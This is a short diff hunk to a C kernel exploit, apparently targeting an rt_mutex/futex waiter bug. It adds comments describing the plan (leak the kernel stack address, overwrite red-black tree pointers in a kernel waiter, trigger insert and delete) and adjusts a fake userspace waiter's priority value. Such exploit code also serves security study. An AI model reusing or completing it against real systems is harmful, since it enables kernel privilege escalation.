@@ -210,8 +210,13 @@ int main(int argc, char **argv){
 		perror("mmap");
 	}
 
+	// Basically, we do two things in this exploit: 
+	// overwrite the rb tree pointers in kernel_waiter, and trigger insert-delete of kernel_waiter.
+ 
+	// First, we have to leak the kernel stack address. the blog post (see header) explains this
+	// with illustrations, that explains it better.
 	fake_userspace_waiter->tree_entry.rb_right=fake_userspace_waiter->tree_entry.rb_left=NULL;
-	fake_userspace_waiter->prio = 137 /*2147483647*/;
+	fake_userspace_waiter->prio = 137; // 17 in userspace
 
 	overwrite_waiter = (struct rt_mutex_waiter*) (sem_values+WAITER_OVERWRITE_OFFSET/2);
 
